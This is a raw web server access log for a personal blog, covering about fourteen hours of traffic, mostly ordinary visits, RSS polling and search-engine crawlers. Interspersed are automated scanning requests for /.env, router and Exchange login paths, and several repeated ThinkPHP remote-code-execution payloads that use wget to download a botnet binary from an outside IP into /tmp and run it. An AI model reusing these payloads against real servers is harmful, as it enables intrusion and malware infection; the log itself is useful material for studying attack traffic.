5.173.42.7 - - [17/Oct/2021:18:30:27 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.188.210.227 - - [17/Oct/2021:18:30:47 +0200] "GET http://5.188.210.227/echo.php HTTP/1.1" 301 162 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
171.13.14.41 - - [17/Oct/2021:18:38:53 +0200] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36"
171.13.14.41 - - [17/Oct/2021:18:38:56 +0200] "GET / HTTP/2.0" 200 12714 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
171.13.14.41 - - [17/Oct/2021:18:38:57 +0200] "GET /assets/styles/main.css?v=d702cadabc HTTP/2.0" 200 14057 "https://www.krzwiatrzyk.eu/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
171.13.14.41 - - [17/Oct/2021:18:38:57 +0200] "GET /assets/scripts/main.js?v=d702cadabc HTTP/2.0" 200 9977 "https://www.krzwiatrzyk.eu/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
171.13.14.84 - - [17/Oct/2021:18:38:58 +0200] "GET / HTTP/2.0" 200 12714 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36"
171.13.14.41 - - [17/Oct/2021:18:38:58 +0200] "GET /content/images/size/w300/2021/10/d417ce9e68114f09acc670e5928685a3--5--1.png HTTP/2.0" 200 2741 "https://www.krzwiatrzyk.eu/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
171.13.14.41 - - [17/Oct/2021:18:39:04 +0200] "GET /assets/scripts/pagination.js?v=d702cadabc HTTP/2.0" 200 0 "https://www.krzwiatrzyk.eu/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
171.13.14.41 - - [17/Oct/2021:18:39:13 +0200] "GET /content/images/size/w1000/2021/10/Screenshot_8.png HTTP/2.0" 200 204515 "https://www.krzwiatrzyk.eu/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
171.13.14.41 - - [17/Oct/2021:18:39:13 +0200] "GET /content/images/size/w600/2021/10/Screenshot_8.png HTTP/2.0" 499 0 "https://www.krzwiatrzyk.eu/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
5.173.42.7 - - [17/Oct/2021:18:45:27 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
109.237.103.118 - - [17/Oct/2021:18:48:35 +0200] "GET /.env HTTP/1.1" 400 650 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.118 - - [17/Oct/2021:18:48:35 +0200] "GET /.env HTTP/1.1" 200 595 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
186.12.224.12 - - [17/Oct/2021:18:51:17 +0200] "GET / HTTP/1.0" 301 162 "-" "-"
5.173.42.7 - - [17/Oct/2021:19:00:27 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
209.141.56.209 - - [17/Oct/2021:19:01:31 +0200] "GET / HTTP/1.1" 301 162 "-" "Linux Gnu (cow)"
5.173.42.7 - - [17/Oct/2021:19:15:27 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
13.58.141.241 - - [17/Oct/2021:19:20:31 +0200] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
13.58.141.241 - - [17/Oct/2021:19:20:32 +0200] "GET / HTTP/1.1" 200 12727 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"
5.173.42.7 - - [17/Oct/2021:19:30:27 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
162.142.125.60 - - [17/Oct/2021:19:32:08 +0200] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.60 - - [17/Oct/2021:19:32:09 +0200] "GET / HTTP/1.1" 200 595 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
5.173.42.7 - - [17/Oct/2021:19:45:27 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
209.141.41.12 - - [17/Oct/2021:19:51:26 +0200] "GET /config/getuser?index=0 HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
181.169.17.104 - - [17/Oct/2021:19:53:35 +0200] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
5.173.42.7 - - [17/Oct/2021:20:00:27 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [17/Oct/2021:20:15:28 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
50.18.76.47 - - [17/Oct/2021:20:19:13 +0200] "GET /owa/auth/logon.aspx HTTP/1.1" 200 1345 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
5.173.42.7 - - [17/Oct/2021:20:30:28 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
3.228.10.218 - - [17/Oct/2021:20:34:40 +0200] "GET /rss HTTP/1.1" 301 5 "-" "Ruby"
3.228.10.218 - - [17/Oct/2021:20:34:40 +0200] "GET /rss/ HTTP/1.1" 200 2222 "-" "Ruby"
5.173.42.7 - - [17/Oct/2021:20:45:29 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
119.40.84.254 - - [17/Oct/2021:20:51:40 +0200] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
209.97.185.16 - - [17/Oct/2021:20:55:07 +0200] "GET / HTTP/1.1" 301 162 "http://85.255.1.106:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
5.173.42.7 - - [17/Oct/2021:21:00:28 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [17/Oct/2021:21:15:27 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [17/Oct/2021:21:30:28 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
209.141.62.185 - - [17/Oct/2021:21:40:38 +0200] "GET /config/getuser?index=0 HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
5.173.42.7 - - [17/Oct/2021:21:45:28 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [17/Oct/2021:22:00:28 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
209.141.43.27 - - [17/Oct/2021:22:01:53 +0200] "GET / HTTP/1.1" 301 162 "-" "-"
209.141.43.27 - - [17/Oct/2021:22:02:07 +0200] "POST /HNAP1/ HTTP/1.1" 301 162 "-" "Mozila/5.0"
209.141.51.171 - - [17/Oct/2021:22:08:20 +0200] "POST /boaform/admin/formLogin HTTP/1.1" 301 162 "http://85.255.1.106:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
209.141.51.171 - - [17/Oct/2021:22:08:21 +0200] "" 400 0 "-" "-"
5.173.42.7 - - [17/Oct/2021:22:15:28 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
175.138.88.110 - - [17/Oct/2021:22:19:00 +0200] "GET / HTTP/1.1" 400 150 "-" "-"
77.222.130.97 - - [17/Oct/2021:22:28:03 +0200] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
5.173.42.7 - - [17/Oct/2021:22:30:27 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
37.49.225.13 - - [17/Oct/2021:22:32:57 +0200] "GET /.env HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
37.49.225.13 - - [17/Oct/2021:22:32:57 +0200] "POST / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
37.49.225.13 - - [17/Oct/2021:22:32:58 +0200] "GET /.env HTTP/1.1" 200 595 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
37.49.225.13 - - [17/Oct/2021:22:32:58 +0200] "POST / HTTP/1.1" 405 552 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
162.221.192.26 - - [17/Oct/2021:23:20:15 +0200] "GET / HTTP/1.1" 200 595 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
128.1.248.26 - - [17/Oct/2021:23:21:02 +0200] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
128.1.248.26 - - [17/Oct/2021:23:21:03 +0200] "GET / HTTP/1.1" 200 595 "http://85.255.1.106/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
192.241.197.198 - - [17/Oct/2021:23:25:02 +0200] "GET /manager/text/list HTTP/1.1" 400 248 "-" "Mozilla/5.0 zgrab/0.x"
162.142.125.193 - - [17/Oct/2021:23:27:19 +0200] "GET / HTTP/1.1" 200 1345 "-" "-"
162.142.125.193 - - [17/Oct/2021:23:27:19 +0200] "GET / HTTP/1.1" 200 595 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
181.191.5.71 - - [17/Oct/2021:23:41:57 +0200] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://45.14.226.120/notabotnet/notabotnet.x86 -O /tmp/.notabotnet; chmod 777 /tmp/.notabotnet; /tmp/.notabotnet ThinkphpRep' HTTP/1.1" 400 150 "-" "Tsunami/2.0"
198.12.85.84 - - [18/Oct/2021:00:53:48 +0200] "GET / HTTP/1.1" 200 595 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
18.207.130.102 - - [18/Oct/2021:01:03:42 +0200] "GET /rss HTTP/1.1" 301 5 "-" "Ruby"
18.207.130.102 - - [18/Oct/2021:01:03:42 +0200] "GET /rss/ HTTP/1.1" 200 2217 "-" "Ruby"
66.249.64.61 - - [18/Oct/2021:01:29:59 +0200] "GET /robots.txt HTTP/1.1" 200 108 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.61 - - [18/Oct/2021:01:30:00 +0200] "GET /rss/ HTTP/1.1" 200 2217 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
192.241.205.65 - - [18/Oct/2021:01:30:46 +0200] "GET /manager/html HTTP/1.1" 301 162 "-" "Mozilla/5.0 zgrab/0.x"
66.249.64.57 - - [18/Oct/2021:01:46:45 +0200] "GET /rss/ HTTP/1.1" 200 2217 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
205.185.113.41 - - [18/Oct/2021:02:04:43 +0200] "POST /boaform/admin/formLogin HTTP/1.1" 301 162 "http://85.255.1.106:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
205.185.113.41 - - [18/Oct/2021:02:04:43 +0200] "" 400 0 "-" "-"
209.97.185.16 - - [18/Oct/2021:02:21:23 +0200] "GET / HTTP/1.1" 301 162 "http://85.255.1.106:80/left.html" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0"
209.141.51.171 - - [18/Oct/2021:02:53:18 +0200] "POST /boaform/admin/formLogin HTTP/1.1" 301 162 "http://85.255.1.106:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
209.141.51.171 - - [18/Oct/2021:02:53:19 +0200] "" 400 0 "-" "-"
192.241.196.106 - - [18/Oct/2021:03:29:20 +0200] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 200 595 "-" "Mozilla/5.0 zgrab/0.x"
45.137.20.135 - - [18/Oct/2021:03:37:09 +0200] "GET / HTTP/1.1" 301 162 "-" "-"
192.241.210.35 - - [18/Oct/2021:03:45:34 +0200] "GET /manager/html HTTP/1.1" 400 248 "-" "Mozilla/5.0 zgrab/0.x"
157.55.39.17 - - [18/Oct/2021:03:50:40 +0200] "GET /sitemap.xml HTTP/2.0" 200 642 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
209.141.54.186 - - [18/Oct/2021:03:55:30 +0200] "POST /boaform/admin/formLogin HTTP/1.1" 301 162 "http://85.255.1.106:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
209.141.54.186 - - [18/Oct/2021:03:55:30 +0200] "" 400 0 "-" "-"
151.51.85.255 - - [18/Oct/2021:04:07:40 +0200] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://45.14.226.120/notabotnet/notabotnet.x86 -O /tmp/.notabotnet; chmod 777 /tmp/.notabotnet; /tmp/.notabotnet ThinkphpRep' HTTP/1.1" 400 150 "-" "Tsunami/2.0"
162.142.125.59 - - [18/Oct/2021:04:13:28 +0200] "GET / HTTP/1.1" 301 162 "-" "-"
162.142.125.59 - - [18/Oct/2021:04:13:29 +0200] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.59 - - [18/Oct/2021:04:13:29 +0200] "GET / HTTP/1.1" 200 595 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
81.214.72.215 - - [18/Oct/2021:04:20:25 +0200] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://45.14.226.120/notabotnet/notabotnet.x86 -O /tmp/.notabotnet; chmod 777 /tmp/.notabotnet; /tmp/.notabotnet ThinkphpRep' HTTP/1.1" 400 150 "-" "Tsunami/2.0"
81.214.72.215 - - [18/Oct/2021:04:20:36 +0200] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://45.14.226.120/notabotnet/notabotnet.x86 -O /tmp/.notabotnet; chmod 777 /tmp/.notabotnet; /tmp/.notabotnet ThinkphpRep' HTTP/1.1" 400 150 "-" "Tsunami/2.0"
162.62.117.51 - - [18/Oct/2021:04:32:31 +0200] "l\x00\x0B\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 150 "-" "-"
205.185.120.103 - - [18/Oct/2021:04:48:55 +0200] "GET / HTTP/1.1" 301 162 "-" "Linux Gnu (cow)"
35.81.151.203 - - [18/Oct/2021:04:50:24 +0200] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
192.241.209.157 - - [18/Oct/2021:05:25:01 +0200] "GET /portal/redlion HTTP/1.1" 301 162 "-" "Mozilla/5.0 zgrab/0.x"
209.141.62.185 - - [18/Oct/2021:05:50:54 +0200] "GET /config/getuser?index=0 HTTP/1.1" 400 248 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
66.249.64.61 - - [18/Oct/2021:05:53:20 +0200] "GET /robots.txt HTTP/1.1" 200 108 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.61 - - [18/Oct/2021:05:53:20 +0200] "GET /kubernetes-headless-service/amp/ HTTP/1.1" 200 7016 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
18.207.130.102 - - [18/Oct/2021:05:55:48 +0200] "GET /rss HTTP/1.1" 301 5 "-" "Ruby"
18.207.130.102 - - [18/Oct/2021:05:55:48 +0200] "GET /rss/ HTTP/1.1" 200 2217 "-" "Ruby"
192.241.208.135 - - [18/Oct/2021:06:04:02 +0200] "GET /actuator/health HTTP/1.1" 301 162 "-" "Mozilla/5.0 zgrab/0.x"
209.141.56.209 - - [18/Oct/2021:06:23:28 +0200] "GET / HTTP/1.1" 301 162 "-" "Linux Gnu (cow)"
189.126.95.43 - - [18/Oct/2021:06:31:08 +0200] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
66.249.64.59 - - [18/Oct/2021:06:38:20 +0200] "GET /tag/kubernetes-advanced/ HTTP/1.1" 200 12993 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
192.241.206.68 - - [18/Oct/2021:06:41:43 +0200] "GET /hudson HTTP/1.1" 301 162 "-" "Mozilla/5.0 zgrab/0.x"
177.84.42.25 - - [18/Oct/2021:06:46:11 +0200] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
125.64.94.136 - - [18/Oct/2021:07:00:17 +0200] "GET / HTTP/1.0" 301 162 "-" "-"
125.64.94.136 - - [18/Oct/2021:07:00:18 +0200] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
125.64.94.136 - - [18/Oct/2021:07:00:21 +0200] "GET / HTTP/1.1" 200 595 "http://85.255.1.106" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
125.64.94.136 - - [18/Oct/2021:07:00:22 +0200] "GET /favicon.ico HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
125.64.94.136 - - [18/Oct/2021:07:00:23 +0200] "GET /favicon.ico HTTP/1.1" 200 595 "http://85.255.1.106/favicon.ico" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
125.64.94.136 - - [18/Oct/2021:07:00:23 +0200] "GET /robots.txt HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
125.64.94.136 - - [18/Oct/2021:07:00:24 +0200] "GET /robots.txt HTTP/1.1" 200 595 "http://85.255.1.106/robots.txt" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
125.64.94.136 - - [18/Oct/2021:07:00:25 +0200] "GET /.well-known/security.txt HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
125.64.94.136 - - [18/Oct/2021:07:00:26 +0200] "GET /.well-known/security.txt HTTP/1.1" 200 595 "http://85.255.1.106/.well-known/security.txt" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4 240.111 Safari/537.36"
184.105.247.194 - - [18/Oct/2021:07:02:26 +0200] "GET / HTTP/1.1" 200 1345 "-" "-"
209.141.41.12 - - [18/Oct/2021:07:09:00 +0200] "GET /config/getuser?index=0 HTTP/1.1" 301 162 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
66.249.64.39 - - [18/Oct/2021:07:23:20 +0200] "GET /robots.txt HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.59 - - [18/Oct/2021:07:23:20 +0200] "GET /robots.txt HTTP/1.1" 200 108 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.41 - - [18/Oct/2021:07:23:20 +0200] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.57 - - [18/Oct/2021:07:23:21 +0200] "GET / HTTP/1.1" 200 12732 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
5.173.42.7 - - [18/Oct/2021:07:39:01 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
45.61.184.37 - - [18/Oct/2021:07:39:33 +0200] "POST /boaform/admin/formLogin HTTP/1.1" 301 162 "http://85.255.1.106:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
45.61.184.37 - - [18/Oct/2021:07:39:33 +0200] "" 400 0 "-" "-"
205.185.120.103 - - [18/Oct/2021:07:44:32 +0200] "GET / HTTP/1.1" 301 162 "-" "Linux Gnu (cow)"
5.173.42.7 - - [18/Oct/2021:07:54:00 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:08:09:00 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:08:24:00 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
5.173.42.7 - - [18/Oct/2021:08:39:00 +0200] "GET /rss/ HTTP/2.0" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.72"
23.251.102.74 - - [18/Oct/2021:08:39:36 +0200] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
23.251.102.74 - - [18/Oct/2021:08:39:37 +0200] "GET / HTTP/1.1" 200 595 "http://85.255.1.106/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
106.52.34.90 - - [18/Oct/2021:08:42:15 +0200] "GET / HTTP/1.1" 301 162 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
192.241.208.162 - - [18/Oct/2021:08:43:22 +0200] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 200 595 "-" "Mozilla/5.0 zgrab/0.x"
192.241.198.125 - - [18/Oct/2021:08:45:25 +0200] "GET /owa/auth/x.js HTTP/1.1" 200 595 "-" "Mozilla/5.0 zgrab/0.x"
192.241.208.5 - - [18/Oct/2021:08:45:28 +0200] "GET /owa/auth/logon.aspx HTTP/1.1" 200 595 "-" "Mozilla/5.0 zgrab/0.x"
